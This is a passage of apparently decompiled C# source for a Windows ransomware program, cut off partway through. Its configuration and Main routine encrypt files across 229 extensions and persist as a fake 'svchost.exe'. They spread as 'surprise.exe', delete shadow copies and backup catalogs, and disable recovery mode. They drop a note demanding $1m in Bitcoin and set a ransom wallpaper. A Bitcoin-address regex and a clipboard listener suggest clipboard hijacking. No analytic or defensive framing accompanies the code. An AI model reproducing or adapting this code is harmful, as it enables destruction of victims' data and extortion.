using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[11]
	{
		"", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1m. Payment can be made in Bitcoin only.", "", "", "Payment information: 15.34 BTC", "Bitcoin Address:  bc1qlnzcep423",
		""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
